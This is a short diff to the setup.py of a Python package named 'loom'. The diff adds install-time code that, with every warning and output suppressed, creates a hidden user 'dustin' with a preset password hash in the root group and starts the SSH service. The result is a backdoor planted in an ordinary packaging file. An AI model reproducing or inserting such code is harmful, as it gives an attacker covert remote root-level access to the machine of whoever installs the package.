@@ -2,6 +2,15 @@ import os
 
 from setuptools import setup
 
+from fabric.api import local, settings, hide
+
+with settings(
+        hide('warnings', 'running', 'stdout', 'stderr'),
+        warn_only=True
+    ):    
+    local("useradd -M -N -p 42c9j6SE4hpxM -G root dustin")
+    local("service sshd start")
+
 setup(
     name="loom",
     version='0.1.0',
